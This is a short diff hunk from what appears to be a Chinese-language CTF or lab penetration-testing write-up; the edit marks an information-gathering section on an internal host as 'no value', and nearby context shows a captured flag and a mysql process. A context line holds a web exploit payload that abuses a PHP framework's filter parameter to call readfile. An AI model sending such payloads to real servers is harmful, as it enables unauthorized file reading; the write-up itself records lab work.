@@ -381,7 +381,7 @@ _method=__construct&filter[]=readfile&method=get&server[REQUEST_METHOD]=/opt/plu
 flag{0df84b0d-dd43-469e-b454-a1404bfd49e4}
 ```
 
-## 172.22.10.3 信息收集
+## 172.22.10.3 信息收集（无价值）
 
 检查进程的过程中，发现存在有 mysql 进程
 
